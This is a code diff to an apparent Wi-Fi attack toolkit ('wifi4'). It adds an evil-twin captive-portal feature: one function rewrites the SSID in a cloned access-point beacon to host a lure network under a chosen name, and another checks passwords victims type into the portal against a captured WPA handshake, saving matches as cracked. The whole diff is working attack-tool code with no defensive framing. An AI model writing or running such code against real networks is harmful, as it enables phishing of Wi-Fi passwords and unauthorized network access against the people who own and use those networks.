@@ -592,6 +592,65 @@ def targets():
     return json.dumps(rows)
 
 
+def verify_psk(bssid, psk):
+    """Check a submitted password against this AP's saved handshake, in wifi4's own vault.
+
+    ``Vault.verify_wpa_psk`` is the same verdict wifi4's Verify action uses; a match is saved
+    as a manually typed WPA PSK, so the app's capture list shows it as cracked. ``None`` from
+    the vault means no saved hashline, which is not a mismatch — the portal keeps asking.
+    """
+    target = str(bssid or "").lower()
+    candidate = str(psk or "")
+    if not target or not candidate:
+        return json.dumps({"ok": False, "have_handshake": False})
+    vault, _ = _vault_state()
+    try:
+        verdict = vault.verify_wpa_psk(target, candidate)
+    except Exception:
+        traceback.print_exc()
+        verdict = None
+    ok = verdict is True
+    if ok:
+        try:
+            ssid = None
+            if _array is not None:
+                seen = _array.access_points.get(target)
+                ssid = getattr(seen, "ssid", None)
+            vault.save_wpa_psk(ssid, target, candidate, manual=True)
+        except Exception:
+            traceback.print_exc()
+    return json.dumps({"ok": ok, "have_handshake": verdict is not None})
+
+
+def _rename_twin(campaign, ssid):
+    """Host the twin under the AP name the crack sheet chose, not the target's SSID.
+
+    ``EvilTwinCampaign`` clones the target's beacon with its SSID element; AP mode is a lure
+    network, so the one element is rewritten and the campaign's own ``ssid`` follows it (the
+    FakeAP matches probes and builds its probe response from that name).
+    """
+    name = str(ssid or "").strip()
+    beacon = getattr(campaign, "twin_beacon", b"")
+    if not name or name == getattr(campaign, "ssid", None) or len(beacon) < 36:
+        return
+    from wifi4.dot11.ie import iter_information_elements
+
+    encoded = name.encode("utf-8")[:32]
+    head, tags = beacon[:36], beacon[36:]
+    kept = bytearray()
+    replaced = False
+    for tag_id, _body, elem in iter_information_elements(tags):
+        if tag_id == 0:
+            kept += bytes([0, len(encoded)]) + encoded
+            replaced = True
+        else:
+            kept += elem
+    if not replaced:
+        kept = bytes([0, len(encoded)]) + encoded + kept
+    campaign.ssid = name
+    campaign.twin_beacon = head + bytes(kept)
+
+
 def _eviltwin_input(ap, options):
     """The ``EvilTwinInput`` wifi4's modal would have produced, from the app's own sheet.
 
@@ -693,8 +752,12 @@ def attack(kind, bssid=None, options=None):
             if ap is None:
                 raise ValueError("EvilTwin needs a target network")
             campaign = _campaign_class(kind)(_array, ap, _eviltwin_input(ap, settings))
+            _rename_twin(campaign, settings.get("ssid"))
         else:
             args = dict(settings)
+            # AP mode's sheet keys belong to Evil Twin only; a campaign would reject them.
+            for key in ("ssid", "template", "portal"):
+                args.pop(key, None)
             if kind == "wep":
                 # wifi4's WEP campaign names its logger differently from every other campaign.
                 args["log_callback"] = args.pop("log", None) or _ui_log
